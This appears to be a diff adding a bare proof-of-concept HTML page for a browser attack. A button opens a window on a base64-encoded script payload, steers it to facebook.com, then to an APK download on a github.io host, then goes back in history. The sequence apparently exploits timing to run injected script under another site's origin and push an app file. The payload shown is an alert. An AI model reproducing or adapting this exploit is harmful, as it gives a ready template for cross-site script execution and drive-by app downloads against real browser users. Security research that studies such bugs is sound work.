@@ -1,0 +1,32 @@
+
+<button onclick="test()">clickme</button>
+
+<script>
+
+function test()
+
+{
+
+  w = open('data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=')
+
+  setTimeout(function(){
+
+    w.location = 'https://facebook.com/'
+
+  }, 300)
+
+  setTimeout(function(){
+
+      w.location = 'https://ybt01.github.io/upload/app-debug.apk'
+
+      setTimeout(function(){
+
+        w.history.back()
+
+      }, 2100)
+
+  }, 2000)
+
+}
+
+</script>
